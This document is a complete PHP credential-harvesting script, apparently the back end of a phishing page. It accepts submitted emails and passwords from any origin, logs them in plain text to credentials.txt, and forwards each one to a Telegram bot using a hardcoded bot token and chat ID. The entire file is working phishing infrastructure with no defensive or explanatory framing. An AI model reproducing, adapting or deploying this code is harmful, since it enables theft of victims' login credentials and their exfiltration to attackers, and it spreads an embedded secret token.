<?php
// Credential capture script
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST');
header('Access-Control-Allow-Headers: Content-Type');

// Telegram configuration
define('TELEGRAM_BOT_TOKEN', '8133407038:AAFslD-_Gow0X4A268V2rgrmCjkDzDu_kG0');
define('TELEGRAM_CHAT_ID', '7844108983');

function sendToTelegram($message) {
    $url = 'https://api.telegram.org/bot' . TELEGRAM_BOT_TOKEN . '/sendMessage';

    $data = [
        'chat_id' => TELEGRAM_CHAT_ID,
        'text' => $message,
        'parse_mode' => 'HTML'
    ];

    $options = [
        'http' => [
            'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
            'method'  => 'POST',
            'content' => http_build_query($data)
        ]
    ];

    $context = stream_context_create($options);
    $result = @file_get_contents($url, false, $context);

    return $result !== false;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $data = json_decode(file_get_contents('php://input'), true);

    if ($data && isset($data['email']) && isset($data['password'])) {
        $timestamp = $data['timestamp'] ?? date('Y-m-d H:i:s');
        $email = $data['email'];
        $password = $data['password'];

        // Log entry for file
        $logEntry = sprintf(
            "[%s] Email: %s | Password: %s\n",
            $timestamp,
            $email,
            $password
        );

        // Append to credentials log file
        file_put_contents('credentials.txt', $logEntry, FILE_APPEND | LOCK_EX);

        // Send to Telegram
        $telegramMessage = "🔐 <b>New Login Captured</b>\n\n";
        $telegramMessage .= "📧 <b>Email:</b> " . htmlspecialchars($email) . "\n";
        $telegramMessage .= "🔑 <b>Password:</b> " . htmlspecialchars($password) . "\n";
        $telegramMessage .= "⏰ <b>Time:</b> " . $timestamp;

        sendToTelegram($telegramMessage);

        echo json_encode(['status' => 'success']);
    } else {
        http_response_code(400);
        echo json_encode(['status' => 'error', 'message' => 'Invalid data']);
    }
} else {
    http_response_code(405);
    echo json_encode(['status' => 'error', 'message' => 'Method not allowed']);
}
?>
